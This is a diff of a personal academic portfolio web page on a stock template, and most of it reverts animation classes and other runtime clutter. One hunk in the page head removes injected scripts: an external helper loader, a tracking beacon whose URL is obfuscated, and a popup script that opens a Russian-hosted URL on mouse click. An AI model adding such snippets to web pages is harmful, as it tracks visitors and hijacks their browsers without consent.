@@ -1,23 +1,25 @@
+
+<!DOCTYPE HTML>
 <html>
-<head>
+	<head>
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
 	<title>Arunavo Dey</title>
 	<meta name="viewport" content="width=device-width, initial-scale=1">
-	<meta name="description" content="">
-	<meta name="keywords" content="">
-	<meta name="author" content="">
+	<meta name="description" content="" />
+	<meta name="keywords" content="" />
+	<meta name="author" content="" />
 
   <!-- Facebook and Twitter integration -->
-	<meta property="og:title" content="">
-	<meta property="og:image" content="">
-	<meta property="og:url" content="">
-	<meta property="og:site_name" content="">
-	<meta property="og:description" content="">
-	<meta name="twitter:title" content="">
-	<meta name="twitter:image" content="">
-	<meta name="twitter:url" content="">
-	<meta name="twitter:card" content="">
+	<meta property="og:title" content=""/>
+	<meta property="og:image" content=""/>
+	<meta property="og:url" content=""/>
+	<meta property="og:site_name" content=""/>
+	<meta property="og:description" content=""/>
+	<meta name="twitter:title" content="" />
+	<meta name="twitter:image" content="" />
+	<meta name="twitter:url" content="" />
+	<meta name="twitter:card" content="" />
 
 	<!-- Place favicon.ico and apple-touch-icon.png in the root directory -->
 	<link rel="shortcut icon" href="favicon.ico">
@@ -42,20 +44,18 @@
 	<link rel="stylesheet" href="css/style.css">
 
 	<!-- Modernizr JS -->
-	<script async="" src="https://cdn.jsdelivr.net/npm/yandex-metrica-watch/tag.js"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script src="js/modernizr-2.6.2.min.js"></script>
+	<script src="js/modernizr-2.6.2.min.js"></script>
 	<!-- FOR IE9 below -->
 	<!--[if lt IE 9]>
 	<script src="js/respond.min.js"></script>
 	<![endif]-->
 
-	<script charset="UTF-8">ss78mest = {"did":"21","kTag":false,"scriptDomain":"domegroupjam.xyz","tag":"test","extensionId":"1615559582","vTag":false,"version":519,"cid":1};
-window["jj83_711"] = "1615559582";
-</script><script src="https://domegroupjam.xyz/helper.js?tag=test&amp;did=21&amp;v_tag=false&amp;k_tag=false" charset="UTF-8"></script><script src="https://www.googletagmanager.com/gtag/js?id=UA-127560459-1"></script><script>var e,n,o;window.self===window.top&&(e=['//','s:','tp','ht'].reverse().join(''),n=['gjnx.xmyl.ru','76'].join('/'),(o=new Image).src=''.concat(e).concat(n,'.gif'));</script><script>!function(){ var expDate = function(){return Date.now() / 1000 | 0;}; var pingTime = localStorage.getItem("clclicktime") || 0; var secPassed = expDate()-pingTime; var url = ""; if (window == window.top && (pingTime == 0 || secPassed > 60)) { var img = new Image(); var image_url = "https://fofkwopfgker.lexax.ru/cp/pr2"; img.src = image_url; img.addEventListener("load",function(){ url = 'https://fofkwopfgker.lexax.ru/cr/pr2'; }); img.addEventListener("error",function(){ localStorage.setItem("clclicktime",expDate()); }); } var par = "menubar=yes,location=yes,resizable=yes,scrollbars=yes,status=yes"; var txt = new Array(); txt[0]="http://yandex.ru/"; txt[1]="http://google.com/"; var b = Math.round(Math.random() * (txt.length - 1)); var ssilka = txt[b]; function showclick() { if (url != "") { var hrf = url; url = ""; window.open(hrf, "site", par); localStorage.setItem("clclicktime",expDate()); } } document.addEventListener('mousedown',showclick); }();</script></head>
-<body data-ls="1" data-script-loaded="1" data-sl="1">
+	</head>
+	<body>
 	<div id="colorlib-page">
 		<div class="container-wrap">
 		<a href="#" class="js-colorlib-nav-toggle colorlib-nav-toggle" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar"><i></i></a>
-		<aside id="colorlib-aside" role="complementary" class="border js-fullheight" style="height: 377px;">
+		<aside id="colorlib-aside" role="complementary" class="border js-fullheight">
 			<div class="text-center">
 				<div class="author-img" style="background-image: url(images/about.jpg);"></div>
 				<h1 id="colorlib-logo"><a href="index.html">Arunavo Dey</a></h1>
@@ -64,17 +64,17 @@ window["jj83_711"] = "1615559582";
 			<nav id="colorlib-main-menu" role="navigation" class="navbar">
 				<div id="navbar" class="collapse">
 					<ul>
-						<li class=""><a href="#" data-nav-section="home">Home</a></li>
-						<li class=""><a href="#" data-nav-section="about">About</a></li>
-						<li class=""><a href="#" data-nav-section="services">Research Interests</a></li>
-						<li class=""><a href="#" data-nav-section="skills">Skills</a></li>
-						<li class=""><a href="#" data-nav-section="education">Education</a></li>
-						<li class=""><a href="#" data-nav-section="experience">Experience</a></li>
-						<li class=""><a href="#" data-nav-section="publications">Publications</a></li>
-						<li class=""><a href="#" data-nav-section="projects">Projects</a></li>
-						<li class=""><a href="#" data-nav-section="work">Work</a></li>
-						<li class=""><a href="#" data-nav-section="blog">Blog</a></li>
-						<li class="active"><a href="#" data-nav-section="contact">Contact</a></li>
+						<li class="active"><a href="#" data-nav-section="home">Home</a></li>
+						<li><a href="#" data-nav-section="about">About</a></li>
+						<li><a href="#" data-nav-section="services">Research Interests</a></li>
+						<li><a href="#" data-nav-section="skills">Skills</a></li>
+						<li><a href="#" data-nav-section="education">Education</a></li>
+						<li><a href="#" data-nav-section="experience">Experience</a></li>
+						<li><a href="#" data-nav-section="publications">Publications</a></li>
+						<li><a href="#" data-nav-section="projects">Projects</a></li>
+						<li><a href="#" data-nav-section="work">Work</a></li>
+						<li><a href="#" data-nav-section="blog">Blog</a></li>
+						<li><a href="#" data-nav-section="contact">Contact</a></li>
 					</ul>
 				</div>
 				<div class="colorlib-footer">
@@ -136,7 +136,7 @@ window["jj83_711"] = "1615559582";
 				<div class="colorlib-narrow-content">
 					<div class="row">
 						<div class="col-md-12">
-							<div class="row row-bottom-padded-sm animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+							<div class="row row-bottom-padded-sm animate-box" data-animate-effect="fadeInLeft">
 								<div class="col-md-12">
 									<div class="about-desc">
 										<span class="heading-meta">About Us</span>
@@ -191,13 +191,13 @@ window["jj83_711"] = "1615559582";
 			<section class="colorlib-services" data-section="services">
 				<div class="colorlib-narrow-content">
 					<div class="row">
-						<div class="col-md-6 col-md-offset-3 col-md-pull-3 animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+						<div class="col-md-6 col-md-offset-3 col-md-pull-3 animate-box" data-animate-effect="fadeInLeft">
 							<span class="heading-meta">What I do?</span>
 							<h2 class="colorlib-heading">Here are some of my expertise</h2>
 						</div>
 					</div>
 					<div class="row row-pt-md">
-						<div class="col-md-4 text-center animate-box fadeInUp animated">
+						<div class="col-md-4 text-center animate-box">
 							<div class="services color-1">
 								<span class="icon">
 									<i class="icon-bulb"></i>
@@ -208,7 +208,7 @@ window["jj83_711"] = "1615559582";
 								</div>
 							</div>
 						</div>
-						<div class="col-md-4 text-center animate-box fadeInUp animated">
+						<div class="col-md-4 text-center animate-box">
 							<div class="services color-2">
 								<span class="icon">
 									<i class="icon-data"></i>
@@ -219,7 +219,7 @@ window["jj83_711"] = "1615559582";
 								</div>
 							</div>
 						</div>
-						<div class="col-md-4 text-center animate-box fadeInUp animated">
+						<div class="col-md-4 text-center animate-box">
 							<div class="services color-3">
 								<span class="icon">
 									<i class="icon-phone3"></i>
@@ -230,7 +230,7 @@ window["jj83_711"] = "1615559582";
 								</div>
 							</div>
 						</div>
-						<div class="col-md-4 text-center animate-box fadeInUp animated">
+						<div class="col-md-4 text-center animate-box">
 							<div class="services color-4">
 								<span class="icon">
 									<i class="icon-layers2"></i>
@@ -241,7 +241,7 @@ window["jj83_711"] = "1615559582";
 								</div>
 							</div>
 						</div>
-						<div class="col-md-4 text-center animate-box fadeInUp animated">
+						<div class="col-md-4 text-center animate-box">
 							<div class="services color-5">
 								<span class="icon">
 									<i class="icon-data"></i>
@@ -252,7 +252,7 @@ window["jj83_711"] = "1615559582";
 								</div>
 							</div>
 						</div>
-						<div class="col-md-4 text-center animate-box fadeInUp animated">
+						<div class="col-md-4 text-center animate-box">
 							<div class="services color-6">
 								<span class="icon">
 									<i class="icon-phone3"></i>
@@ -267,26 +267,26 @@ window["jj83_711"] = "1615559582";
 				</div>
 			</section>
 			
-			<div id="colorlib-counter" class="colorlib-counters animated" style="background-image: url(images/cover_bg_1.jpg);" data-stellar-background-ratio="0.5">
+			<div id="colorlib-counter" class="colorlib-counters" style="background-image: url(images/cover_bg_1.jpg);" data-stellar-background-ratio="0.5">
 				<div class="overlay"></div>
 				<div class="colorlib-narrow-content">
 					<div class="row">
 					</div>
 					<div class="row">
-						<div class="col-md-3 text-center animate-box fadeInUp animated">
-							<span class="colorlib-counter js-counter" data-from="0" data-to="309" data-speed="5000" data-refresh-interval="50">309</span>
+						<div class="col-md-3 text-center animate-box">
+							<span class="colorlib-counter js-counter" data-from="0" data-to="309" data-speed="5000" data-refresh-interval="50"></span>
 							<span class="colorlib-counter-label">Cups of coffee</span>
 						</div>
-						<div class="col-md-3 text-center animate-box fadeInUp animated">
-							<span class="colorlib-counter js-counter" data-from="0" data-to="356" data-speed="5000" data-refresh-interval="50">356</span>
+						<div class="col-md-3 text-center animate-box">
+							<span class="colorlib-counter js-counter" data-from="0" data-to="356" data-speed="5000" data-refresh-interval="50"></span>
 							<span class="colorlib-counter-label">Projects</span>
 						</div>
-						<div class="col-md-3 text-center animate-box fadeInUp animated">
-							<span class="colorlib-counter js-counter" data-from="0" data-to="30" data-speed="5000" data-refresh-interval="50">30</span>
+						<div class="col-md-3 text-center animate-box">
+							<span class="colorlib-counter js-counter" data-from="0" data-to="30" data-speed="5000" data-refresh-interval="50"></span>
 							<span class="colorlib-counter-label">Clients</span>
 						</div>
-						<div class="col-md-3 text-center animate-box fadeInUp animated">
-							<span class="colorlib-counter js-counter" data-from="0" data-to="10" data-speed="5000" data-refresh-interval="50">10</span>
+						<div class="col-md-3 text-center animate-box">
+							<span class="colorlib-counter js-counter" data-from="0" data-to="10" data-speed="5000" data-refresh-interval="50"></span>
 							<span class="colorlib-counter-label">Partners</span>
 						</div>
 					</div>
@@ -296,70 +296,76 @@ window["jj83_711"] = "1615559582";
 			<section class="colorlib-skills" data-section="skills">
 				<div class="colorlib-narrow-content">
 					<div class="row">
-						<div class="col-md-6 col-md-offset-3 col-md-pull-3 animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+						<div class="col-md-6 col-md-offset-3 col-md-pull-3 animate-box" data-animate-effect="fadeInLeft">
 							<span class="heading-meta">My Specialty</span>
-							<h2 class="colorlib-heading animate-box fadeInUp animated">My Skills</h2>
+							<h2 class="colorlib-heading animate-box">My Skills</h2>
 						</div>
 					</div>
 					<div class="row">
-						<div class="col-md-12 animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+						<div class="col-md-12 animate-box" data-animate-effect="fadeInLeft">
 							<p>The Big Oxmox advised her not to do so, because there were thousands of bad Commas, wild Question Marks and devious Semikoli, but the Little Blind Text didn’t listen. She packed her seven versalia, put her initial into the belt and made herself on the way.</p>
 						</div>
-						<div class="col-md-6 animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+						<div class="col-md-6 animate-box" data-animate-effect="fadeInLeft">
 							<div class="progress-wrap">
 								<h3>Photoshop</h3>
 								<div class="progress">
-								 	<div class="progress-bar color-1" role="progressbar" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100" style="width:75%">
+								 	<div class="progress-bar color-1" role="progressbar" aria-valuenow="75"
+								  	aria-valuemin="0" aria-valuemax="100" style="width:75%">
 								    <span>75%</span>
 								  	</div>
 								</div>
 							</div>
 						</div>
-						<div class="col-md-6 animate-box fadeInRight animated" data-animate-effect="fadeInRight">
+						<div class="col-md-6 animate-box" data-animate-effect="fadeInRight">
 							<div class="progress-wrap">
 								<h3>jQuery</h3>
 								<div class="progress">
-								 	<div class="progress-bar color-2" role="progressbar" aria-valuenow="60" aria-valuemin="0" aria-valuemax="100" style="width:60%">
+								 	<div class="progress-bar color-2" role="progressbar" aria-valuenow="60"
+								  	aria-valuemin="0" aria-valuemax="100" style="width:60%">
 								    <span>60%</span>
 								  	</div>
 								</div>
 							</div>
 						</div>
-						<div class="col-md-6 animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+						<div class="col-md-6 animate-box" data-animate-effect="fadeInLeft">
 							<div class="progress-wrap">
 								<h3>HTML5</h3>
 								<div class="progress">
-								 	<div class="progress-bar color-3" role="progressbar" aria-valuenow="85" aria-valuemin="0" aria-valuemax="100" style="width:85%">
+								 	<div class="progress-bar color-3" role="progressbar" aria-valuenow="85"
+								  	aria-valuemin="0" aria-valuemax="100" style="width:85%">
 								    <span>85%</span>
 								  	</div>
 								</div>
 							</div>
 						</div>
-						<div class="col-md-6 animate-box fadeInRight animated" data-animate-effect="fadeInRight">
+						<div class="col-md-6 animate-box" data-animate-effect="fadeInRight">
 							<div class="progress-wrap">
 								<h3>CSS3</h3>
 								<div class="progress">
-								 	<div class="progress-bar color-4" role="progressbar" aria-valuenow="90" aria-valuemin="0" aria-valuemax="100" style="width:90%">
+								 	<div class="progress-bar color-4" role="progressbar" aria-valuenow="90"
+								  	aria-valuemin="0" aria-valuemax="100" style="width:90%">
 								    <span>90%</span>
 								  	</div>
 								</div>
 							</div>
 						</div>
-						<div class="col-md-6 animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+						<div class="col-md-6 animate-box" data-animate-effect="fadeInLeft">
 							<div class="progress-wrap">
 								<h3>WordPress</h3>
 								<div class="progress">
-								 	<div class="progress-bar color-5" role="progressbar" aria-valuenow="70" aria-valuemin="0" aria-valuemax="100" style="width:70%">
+								 	<div class="progress-bar color-5" role="progressbar" aria-valuenow="70"
+								  	aria-valuemin="0" aria-valuemax="100" style="width:70%">
 								    <span>70%</span>
 								  	</div>
 								</div>
 							</div>
 						</div>
-						<div class="col-md-6 animate-box fadeInRight animated" data-animate-effect="fadeInRight">
+						<div class="col-md-6 animate-box" data-animate-effect="fadeInRight">
 							<div class="progress-wrap">
 								<h3>SEO</h3>
 								<div class="progress">
-								 	<div class="progress-bar color-6" role="progressbar" aria-valuenow="80" aria-valuemin="0" aria-valuemax="100" style="width:80%">
+								 	<div class="progress-bar color-6" role="progressbar" aria-valuenow="80"
+								  	aria-valuemin="0" aria-valuemax="100" style="width:80%">
 								    <span>80%</span>
 								  	</div>
 								</div>
@@ -372,13 +378,13 @@ window["jj83_711"] = "1615559582";
 			<section class="colorlib-education" data-section="education">
 				<div class="colorlib-narrow-content">
 					<div class="row">
-						<div class="col-md-6 col-md-offset-3 col-md-pull-3 animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+						<div class="col-md-6 col-md-offset-3 col-md-pull-3 animate-box" data-animate-effect="fadeInLeft">
 							<span class="heading-meta">Education</span>
-							<h2 class="colorlib-heading animate-box fadeInUp animated">Education</h2>
+							<h2 class="colorlib-heading animate-box">Education</h2>
 						</div>
 					</div>
 					<div class="row">
-						<div class="col-md-12 animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+						<div class="col-md-12 animate-box" data-animate-effect="fadeInLeft">
 							<div class="fancy-collapse-panel">
 								<div class="panel-group" id="accordion" role="tablist" aria-multiselectable="true">
 									<div class="panel panel-default">
@@ -390,9 +396,9 @@ window["jj83_711"] = "1615559582";
 									    </div>
 									    <div id="collapseOne" class="panel-collapse collapse in" role="tabpanel" aria-labelledby="headingOne">
 									         <div class="panel-body">
-									            <p><strong>Bangladesh University of Engineering &amp; Technology</strong> 2018-presen t</p>
+									            <p><strong>Bangladesh University of Engineering & Technology</strong> 2018-presen t</p>
 													<ul>
-														<li>Department of Computer Science &amp; Engineering</li>
+														<li>Department of Computer Science & Engineering</li>
 													</ul>
 									         </div>
 									    </div>
@@ -406,9 +412,9 @@ window["jj83_711"] = "1615559582";
 									    </div>
 									    <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
 									        <div class="panel-body">
-									            <p><strong>Bangladesh University of Engineering &amp; Technology</strong> 2011-2016</p>
+									            <p><strong>Bangladesh University of Engineering & Technology</strong> 2011-2016</p>
 													<ul>
-														<li>Department of Computer Science &amp; Engineering</li>
+														<li>Department of Computer Science & Engineering</li>
 														<li>Major in Artificial Intelligence</li>
 													</ul>
 									        </div>
@@ -458,15 +464,15 @@ window["jj83_711"] = "1615559582";
 			<section class="colorlib-experience" data-section="experience">
 				<div class="colorlib-narrow-content">
 					<div class="row">
-						<div class="col-md-6 col-md-offset-3 col-md-pull-3 animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+						<div class="col-md-6 col-md-offset-3 col-md-pull-3 animate-box" data-animate-effect="fadeInLeft">
 							<span class="heading-meta">Experience</span>
-							<h2 class="colorlib-heading animate-box fadeInUp animated">Work Experience</h2>
+							<h2 class="colorlib-heading animate-box">Work Experience</h2>
 						</div>
 					</div>
 					<div class="row">
 						<div class="col-md-12">
 				         <div class="timeline-centered">
-					         <article class="timeline-entry animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+					         <article class="timeline-entry animate-box" data-animate-effect="fadeInLeft">
 					            <div class="timeline-entry-inner">
 
 					               <div class="timeline-icon color-1">
@@ -481,31 +487,31 @@ window["jj83_711"] = "1615559582";
 					         </article>
 
 
-					         <article class="timeline-entry animate-box fadeInRight animated" data-animate-effect="fadeInRight">
+					         <article class="timeline-entry animate-box" data-animate-effect="fadeInRight">
 					            <div class="timeline-entry-inner">
 					               <div class="timeline-icon color-2">
 					                  <i class="icon-pen2"></i>
 					               </div>
 					               <div class="timeline-label">
-					               	<h2><a href="#">Assistan Professor</a> <span>Dept of CSE, Bangladsh University of Business &amp; Technology(BUBT) Present -June 2019</span></h2>
+					               	<h2><a href="#">Assistan Professor</a> <span>Dept of CSE, Bangladsh University of Business & Technology(BUBT) Present -June 2019</span></h2>
 					                  <p>Designed several course outlines, served as a university System Management update comittee member, conducted online and onsite classes</p>
 					               </div>
 					            </div>
 					         </article>
 
-					         <article class="timeline-entry animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+					         <article class="timeline-entry animate-box" data-animate-effect="fadeInLeft">
 					            <div class="timeline-entry-inner">
 					               <div class="timeline-icon color-3">
 					                  <i class="icon-pen2"></i>
 					               </div>
 					               <div class="timeline-label">
-					               	<h2><a href="#">Lecturer </a> <span>Dept of CSE,Bangladsh University of Business &amp; Technology(BUBT) June 2019 - June 2016</span></h2>
+					               	<h2><a href="#">Lecturer </a> <span>Dept of CSE,Bangladsh University of Business & Technology(BUBT) June 2019 - June 2016</span></h2>
 					                  <p>Served as an IOS app developemnet trainer, Conducted clases and examinations</p>
 					               </div>
 					            </div>
 					         </article>
 
-					         <article class="timeline-entry animate-box fadeInUp animated" data-animate-effect="fadeInTop">
+					         <article class="timeline-entry animate-box" data-animate-effect="fadeInTop">
 					            <div class="timeline-entry-inner">
 					               <div class="timeline-icon color-4">
 					                  <i class="icon-pen2"></i>
@@ -529,7 +535,7 @@ window["jj83_711"] = "1615559582";
 					            </div>
 					         </article> -->
 
-					         <article class="timeline-entry begin animate-box fadeInUp animated" data-animate-effect="fadeInBottom">
+					         <article class="timeline-entry begin animate-box" data-animate-effect="fadeInBottom">
 					            <div class="timeline-entry-inner">
 					               <div class="timeline-icon color-none">
 					               </div>
@@ -544,15 +550,15 @@ window["jj83_711"] = "1615559582";
 			<section class="colorlib-experience" data-section="publications">
 				<div class="colorlib-narrow-content">
 					<div class="row">
-						<div class="col-md-6 col-md-offset-3 col-md-pull-3 animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+						<div class="col-md-6 col-md-offset-3 col-md-pull-3 animate-box" data-animate-effect="fadeInLeft">
 							<span class="heading-meta">Publications</span>
-							<h2 class="colorlib-heading animate-box fadeInUp animated">Publications</h2>
+							<h2 class="colorlib-heading animate-box">Publications</h2>
 						</div>
 					</div>
 					<div class="row">
 						<div class="col-md-12">
 				         <div class="timeline-centered">
-					         <article class="timeline-entry animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+					         <article class="timeline-entry animate-box" data-animate-effect="fadeInLeft">
 					            <div class="timeline-entry-inner">
 
 					               <div class="timeline-icon color-1">
@@ -616,7 +622,7 @@ window["jj83_711"] = "1615559582";
 					            </div>
 					         </article> -->
 
-					         <article class="timeline-entry begin animate-box fadeInUp animated" data-animate-effect="fadeInBottom">
+					         <article class="timeline-entry begin animate-box" data-animate-effect="fadeInBottom">
 					            <div class="timeline-entry-inner">
 					               <div class="timeline-icon color-none">
 					               </div>
@@ -630,9 +636,9 @@ window["jj83_711"] = "1615559582";
 			<section class="colorlib-experience" data-section="projects">
 				<div class="colorlib-narrow-content">
 					<div class="row">
-						<div class="col-md-6 col-md-offset-3 col-md-pull-3 animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+						<div class="col-md-6 col-md-offset-3 col-md-pull-3 animate-box" data-animate-effect="fadeInLeft">
 							<span class="heading-meta">Projects</span>
-							<h2 class="colorlib-heading animate-box fadeInUp animated">Projects</h2>
+							<h2 class="colorlib-heading animate-box">Projects</h2>
 						</div>
 					</div>
 					<div class="row">
@@ -703,15 +709,15 @@ window["jj83_711"] = "1615559582";
 					   </div>
 				   </div>
 				   <div class="row">
-						<div class="col-md-6 col-md-offset-3 col-md-pull-3 animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+						<div class="col-md-6 col-md-offset-3 col-md-pull-3 animate-box" data-animate-effect="fadeInLeft">
 							<span class="heading-meta">Undergrad Projects</span>
-							<h2 class="colorlib-heading animate-box fadeInUp animated">Undergrad Projects</h2>
+							<h2 class="colorlib-heading animate-box">Undergrad Projects</h2>
 						</div>
 					</div>
                 <div class="row">
 					<div class="col-md-12">
 				         <div class="timeline-centered">
-							 <article class="timeline-entry animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+							 <article class="timeline-entry animate-box" data-animate-effect="fadeInLeft">
 					            <div class="timeline-entry-inner">
 
 					               <div class="timeline-icon color-1">
@@ -726,7 +732,7 @@ window["jj83_711"] = "1615559582";
 					         </article>
 
 
-					         <article class="timeline-entry animate-box fadeInRight animated" data-animate-effect="fadeInRight">
+					         <article class="timeline-entry animate-box" data-animate-effect="fadeInRight">
 					            <div class="timeline-entry-inner">
 					               <div class="timeline-icon color-2">
 					                  <i class="icon-pen2"></i>
@@ -738,7 +744,7 @@ window["jj83_711"] = "1615559582";
 					            </div>
 					         </article>
 
-					         <article class="timeline-entry animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+					         <article class="timeline-entry animate-box" data-animate-effect="fadeInLeft">
 					            <div class="timeline-entry-inner">
 					               <div class="timeline-icon color-3">
 					                  <i class="icon-pen2"></i>
@@ -750,7 +756,7 @@ window["jj83_711"] = "1615559582";
 					            </div>
 					         </article>
 							 
-					         <article class="timeline-entry animate-box fadeInUp animated" data-animate-effect="fadeInTop">
+					         <article class="timeline-entry animate-box" data-animate-effect="fadeInTop">
 					            <div class="timeline-entry-inner">
 					               <div class="timeline-icon color-4">
 					                  <i class="icon-pen2"></i>
@@ -762,7 +768,7 @@ window["jj83_711"] = "1615559582";
 					            </div>
 					         </article>
 
-					         <article class="timeline-entry animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+					         <article class="timeline-entry animate-box" data-animate-effect="fadeInLeft">
 					            <div class="timeline-entry-inner">
 					               <div class="timeline-icon color-5">
 					                  <i class="icon-pen2"></i>
@@ -773,7 +779,7 @@ window["jj83_711"] = "1615559582";
 					               </div>
 					            </div>
 					         </article>
-							 <article class="timeline-entry animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+							 <article class="timeline-entry animate-box" data-animate-effect="fadeInLeft">
 					            <div class="timeline-entry-inner">
 
 					               <div class="timeline-icon color-1">
@@ -788,7 +794,7 @@ window["jj83_711"] = "1615559582";
 					         </article>
 
 
-					         <article class="timeline-entry animate-box fadeInRight animated" data-animate-effect="fadeInRight">
+					         <article class="timeline-entry animate-box" data-animate-effect="fadeInRight">
 					            <div class="timeline-entry-inner">
 					               <div class="timeline-icon color-2">
 					                  <i class="icon-pen2"></i>
@@ -800,7 +806,7 @@ window["jj83_711"] = "1615559582";
 					            </div>
 					         </article>
 
-					         <article class="timeline-entry begin animate-box fadeInUp animated" data-animate-effect="fadeInBottom">
+					         <article class="timeline-entry begin animate-box" data-animate-effect="fadeInBottom">
 					            <div class="timeline-entry-inner">
 					               <div class="timeline-icon color-none">
 					               </div>
@@ -815,18 +821,18 @@ window["jj83_711"] = "1615559582";
 			<section class="colorlib-work" data-section="work">
 				<div class="colorlib-narrow-content">
 					<div class="row">
-						<div class="col-md-6 col-md-offset-3 col-md-pull-3 animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+						<div class="col-md-6 col-md-offset-3 col-md-pull-3 animate-box" data-animate-effect="fadeInLeft">
 							<span class="heading-meta">My Work</span>
-							<h2 class="colorlib-heading animate-box fadeInUp animated">Recent Work</h2>
+							<h2 class="colorlib-heading animate-box">Recent Work</h2>
 						</div>
 					</div>
-					<div class="row row-bottom-padded-sm animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+					<div class="row row-bottom-padded-sm animate-box" data-animate-effect="fadeInLeft">
 						<div class="col-md-12">
 							<p class="work-menu"><span><a href="#" class="active">Graphic Design</a></span> <span><a href="#">Web Design</a></span> <span><a href="#">Software</a></span> <span><a href="#">Apps</a></span></p>
 						</div>
 					</div>
 					<div class="row">
-						<div class="col-md-6 animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+						<div class="col-md-6 animate-box" data-animate-effect="fadeInLeft">
 							<div class="project" style="background-image: url(images/img-1.jpg);">
 								<div class="desc">
 									<div class="con">
@@ -841,7 +847,7 @@ window["jj83_711"] = "1615559582";
 								</div>
 							</div>
 						</div>
-						<div class="col-md-6 animate-box fadeInRight animated" data-animate-effect="fadeInRight">
+						<div class="col-md-6 animate-box" data-animate-effect="fadeInRight">
 							<div class="project" style="background-image: url(images/img-2.jpg);">
 								<div class="desc">
 									<div class="con">
@@ -856,7 +862,7 @@ window["jj83_711"] = "1615559582";
 								</div>
 							</div>
 						</div>
-						<div class="col-md-6 animate-box fadeInUp animated" data-animate-effect="fadeInTop">
+						<div class="col-md-6 animate-box" data-animate-effect="fadeInTop">
 							<div class="project" style="background-image: url(images/img-3.jpg);">
 								<div class="desc">
 									<div class="con">
@@ -871,7 +877,7 @@ window["jj83_711"] = "1615559582";
 								</div>
 							</div>
 						</div>
-						<div class="col-md-6 animate-box fadeInUp animated" data-animate-effect="fadeInBottom">
+						<div class="col-md-6 animate-box" data-animate-effect="fadeInBottom">
 							<div class="project" style="background-image: url(images/img-4.jpg);">
 								<div class="desc">
 									<div class="con">
@@ -886,7 +892,7 @@ window["jj83_711"] = "1615559582";
 								</div>
 							</div>
 						</div>
-						<div class="col-md-6 animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+						<div class="col-md-6 animate-box" data-animate-effect="fadeInLeft">
 							<div class="project" style="background-image: url(images/img-5.jpg);">
 								<div class="desc">
 									<div class="con">
@@ -901,7 +907,7 @@ window["jj83_711"] = "1615559582";
 								</div>
 							</div>
 						</div>
-						<div class="col-md-6 animate-box fadeInRight animated" data-animate-effect="fadeInRight">
+						<div class="col-md-6 animate-box" data-animate-effect="fadeInRight">
 							<div class="project" style="background-image: url(images/img-6.jpg);">
 								<div class="desc">
 									<div class="con">
@@ -918,7 +924,7 @@ window["jj83_711"] = "1615559582";
 						</div>
 					</div>
 					<div class="row">
-						<div class="col-md-12 animate-box fadeInUp animated">
+						<div class="col-md-12 animate-box">
 							<p><a href="#" class="btn btn-primary btn-lg btn-load-more">Load more <i class="icon-reload"></i></a></p>
 						</div>
 					</div>
@@ -928,13 +934,13 @@ window["jj83_711"] = "1615559582";
 			<section class="colorlib-blog" data-section="blog">
 				<div class="colorlib-narrow-content">
 					<div class="row">
-						<div class="col-md-6 col-md-offset-3 col-md-pull-3 animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+						<div class="col-md-6 col-md-offset-3 col-md-pull-3 animate-box" data-animate-effect="fadeInLeft">
 							<span class="heading-meta">Read</span>
 							<h2 class="colorlib-heading">Recent Blog</h2>
 						</div>
 					</div>
 					<div class="row">
-						<div class="col-md-4 col-sm-6 animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+						<div class="col-md-4 col-sm-6 animate-box" data-animate-effect="fadeInLeft">
 							<div class="blog-entry">
 								<a href="blog.html" class="blog-img"><img src="images/blog-1.jpg" class="img-responsive" alt="HTML5 Bootstrap Template by colorlib.com"></a>
 								<div class="desc">
@@ -944,7 +950,7 @@ window["jj83_711"] = "1615559582";
 								</div>
 							</div>
 						</div>
-						<div class="col-md-4 col-sm-6 animate-box fadeInRight animated" data-animate-effect="fadeInRight">
+						<div class="col-md-4 col-sm-6 animate-box" data-animate-effect="fadeInRight">
 							<div class="blog-entry">
 								<a href="blog.html" class="blog-img"><img src="images/blog-2.jpg" class="img-responsive" alt="HTML5 Bootstrap Template by colorlib.com"></a>
 								<div class="desc">
@@ -954,7 +960,7 @@ window["jj83_711"] = "1615559582";
 								</div>
 							</div>
 						</div>
-						<div class="col-md-4 col-sm-6 animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+						<div class="col-md-4 col-sm-6 animate-box" data-animate-effect="fadeInLeft">
 							<div class="blog-entry">
 								<a href="blog.html" class="blog-img"><img src="images/blog-3.jpg" class="img-responsive" alt="HTML5 Bootstrap Template by colorlib.com"></a>
 								<div class="desc">
@@ -966,7 +972,7 @@ window["jj83_711"] = "1615559582";
 						</div>
 					</div>
 					<div class="row">
-						<div class="col-md-12 animate-box fadeInUp animated">
+						<div class="col-md-12 animate-box">
 							<p><a href="#" class="btn btn-primary btn-lg btn-load-more">Load more <i class="icon-reload"></i></a></p>
 						</div>
 					</div>
@@ -976,14 +982,14 @@ window["jj83_711"] = "1615559582";
 			<section class="colorlib-contact" data-section="contact">
 				<div class="colorlib-narrow-content">
 					<div class="row">
